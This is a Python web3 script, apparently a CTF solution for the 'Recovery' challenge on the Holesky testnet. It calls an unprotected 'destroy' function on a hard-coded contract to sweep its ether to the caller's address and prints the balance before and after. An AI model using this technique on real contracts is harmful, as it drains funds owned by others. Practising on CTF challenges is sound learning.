# coding=utf-8
"""
@Project     : Web3-CTF-Intensive-CoLearning
@Author      : Snooowgh
@File Name   : Recovery
@Description :
@Time        : 2024/9/04 11:14
"""
from web3 import Web3
import os

# Holesky
w3 = Web3(Web3.HTTPProvider("https://holesky.drpc.org"))

private_key = os.getenv('CTF_PRIVATE_KEY')
addr = w3.eth.account.from_key(private_key).address

target_contract = "0xC1a1118fAAB0Ae16A4Ad026D0c30d139B7e0d550"

contract_abi = [
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "_to",
                "type": "address"
            }
        ],
        "name": "destroy",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
]

contract = w3.eth.contract(address=target_contract, abi=contract_abi)

tx = contract.functions.destroy(addr).build_transaction({
    'from': addr,
    'nonce': w3.eth.get_transaction_count(addr),
    "value": 0,
    "gasPrice": w3.eth.gas_price
})
tx["gas"] = w3.eth.estimate_gas(tx)

print(w3.eth.get_balance(target_contract))

signed_tx = w3.eth.account.sign_transaction(tx, private_key)
tx = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
receipt = w3.eth.wait_for_transaction_receipt(tx)
print(receipt)

print(w3.eth.get_balance(target_contract))
